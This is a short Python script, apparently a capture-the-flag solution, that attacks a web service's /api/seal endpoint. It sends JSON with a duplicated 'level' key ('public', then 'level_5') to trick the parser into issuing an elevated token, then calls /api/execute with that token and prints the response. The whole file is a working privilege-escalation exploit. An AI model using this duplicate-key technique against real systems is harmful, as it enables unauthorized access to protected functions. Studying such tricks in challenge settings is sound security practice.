import requests
import json

BASE_URL = "https://kotoamatsukami-zcgb4f64hq-el.a.run.app"

s = requests.Session()
s.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
})

payload_str = '{"action": "request_access", "subject": "guest", "level": "public", "level": "level_5"}'
r_seal = s.post(f"{BASE_URL}/api/seal", data=payload_str, headers={"Content-Type": "application/json"})
token = r_seal.json().get("token")

r_exec = s.post(f"{BASE_URL}/api/execute", json={"token": token})
print("Execute Headers:")
for k, v in r_exec.headers.items():
    print(f"  {k}: {v}")

print("Execute Body:", r_exec.text)
